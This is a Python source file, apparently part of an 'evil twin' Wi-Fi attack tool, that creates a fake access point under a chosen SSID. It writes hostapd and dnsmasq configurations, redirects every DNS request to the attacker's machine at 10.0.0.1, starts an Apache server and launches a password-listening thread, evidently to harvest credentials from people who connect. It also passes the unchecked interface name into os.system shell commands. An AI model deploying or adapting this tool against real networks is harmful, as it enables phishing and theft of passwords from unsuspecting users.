import os
from threading import Thread
from string import Template

from dbus import Interface
from FakeAccessPoint.password_handler import start_listen

def create_fake_access_point(SSID,interface):
    """
    prepare the environment setup for creating the fake access point.
    """
    create_config_files(SSID,interface) 
    os.system('sudo sh FakeAccessPoint/scripts/openAP.sh') 
    os.system("ifconfig " +interface+ " 10.0.0.1 netmask 255.255.255.0")
    os.system("service apache2 start")
    print('The fake access point: {} '.format(SSID))
    listen_thread = Thread(target=start_listen, daemon=True)
    listen_thread.start()


def create_config_files(SSID,interface):
    """
    create dnsmasq and hostapd config files
    """

    with open('FakeAccessPoint/configs/hostapd.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("ssid="+SSID+"\n")
        f.write("channel=1\n")
        f.write("driver=nl80211\n")

    with open('FakeAccessPoint/configs/dnsmasq.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("bind-interfaces\n")
        f.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
        f.write("dhcp-option=3,10.0.0.1\n") #Set the gateway IP address
        f.write("dhcp-option=6,10.0.0.1\n") #Set dns server address
        f.write("address=/#/10.0.0.1\n") #Redirect all requests to 10.0.0.1

    

    
